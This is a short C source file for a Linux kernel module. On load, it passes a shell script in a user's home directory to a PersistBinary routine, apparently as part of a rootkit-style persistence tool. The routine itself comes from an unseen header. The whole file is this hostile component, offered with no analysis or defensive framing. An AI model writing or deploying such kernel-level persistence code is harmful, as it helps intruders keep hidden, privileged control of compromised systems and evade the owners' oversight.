#include "common.h"
#include "persist.h"
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

static int __init inatInit(void)
{

    char bin_loc[] = "/home/nichole/persist.sh";
    char *argv[] = {bin_loc, "-c", "-la", NULL};
    PersistBinary(bin_loc, argv);
    return 0;
}

static void __exit inatExit(void)
{
}

module_init(inatInit);
module_exit(inatExit);